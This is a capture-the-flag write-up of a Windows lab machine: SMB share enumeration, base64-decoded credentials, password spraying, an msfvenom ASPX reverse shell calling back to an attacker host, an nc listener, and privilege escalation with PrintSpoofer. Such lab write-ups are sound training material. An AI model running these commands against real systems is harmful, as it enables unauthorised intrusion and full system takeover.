

**OS:** Windows  
**Date:** 29.09.2026

## Enumeration
First we save the ip-address as the target variable by running:
```
export target=10.114.160.21
```
(The box did crash during the engagement, so this changed underway - After restarting the box, we can just do this again and update the /etc/hosts file with the new ip)

Our initial scans yields these open ports at the target host:
We see several services running:
  ![](Images/Pasted%20image%2020260929150559.png)

We start by enumerating the smb shares.

With this command we list the shares that are available to the guest user:
```
netexec smb $target -u 'Guest' -p '' --shares
```

![](Images/Pasted%20image%2020260929150659.png)

There is a non-standard share available, nt4wrksv which we will take a look at in a moment, with both read and write permissions. We also check --rid-brute to see if we are able to get a user list:

![](Images/Pasted%20image%2020260929150808.png)

We find several users, which we put into a users file. We also got the domain, which we put into the /etc/hosts file.

Now for looking at the share. We run to crawl the share:
```
netexec smb $target -u 'Guest' -p '' --shares --spider nt4wrksv --regex .
```

![](Images/Pasted%20image%2020260929151142.png)

We see a file that is called passwords.txt, which we of course want to download. To access smb with our guest user we run:
```
smbclient \\\\$target\\nt4wrksv -U 'Guest'
```

![](Images/Pasted%20image%2020260929151320.png)

We then look at the file:

![](Images/Pasted%20image%2020260929151336.png)

We see that this is encoded, so we attempt to decode with base64:

![](Images/Pasted%20image%2020260929151449.png)

It looks like this is the credentials of two different users, one of which we have not seen yet. We then save the contents to passwords and users respectively so that we can attempt password spraying against services.

We attempt spraying against SMB, and we do get valid credentials with Bobs user:

![](Images/Pasted%20image%2020260929152009.png)

We look at the shares again, but find that we have the same permissions as the guest user, so we probably need to look elsewhere.

After poking around for awhile, there is a http server at port 49663 and we are able to access the passwords.txt file from earlier:

![](Images/Pasted%20image%2020260929161550.png)

This looks promising since we can make a payload for a reverse shell and put it into the directory and access it from the browser.
## Exploitation

We create the payload with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.148.97 LPORT=53 -f aspx -o rev.aspx
```

Then we put it into the smb folder:

![](Images/Pasted%20image%2020260929161741.png)

Then we set up a listener for the port we listed in the payload:
```
rlwrap nc -lvnp 53
```

And then we access it in the browser:

![](Images/Pasted%20image%2020260929161857.png)

And we have a shell.

We also see that this user has a lot of privileges:

![](Images/Pasted%20image%2020260929162005.png)

We check the flag:

![](Images/Pasted%20image%2020260929162258.png)
  

## Post-Exploitation (Privilege Escalation)

We can use Printspoofer64.exe with the SeImpersonatePrivilege permission.
To upload to the server, we go to /opt/tools/privesc and then access SMB since we have write privileges there. We then put PrintSpoofer64.exe onto the server:

![](Images/Pasted%20image%2020260929163744.png)

Now that we have uploaded it, we can run:
```
printspoofer64.exe -i -c cmd
```

It runs and it successfully elevated our privileges:

![](Images/Pasted%20image%2020260929163912.png)


We go to desktop, fetch the flag and call it a day for now:

![](Images/Pasted%20image%2020260929164012.png)
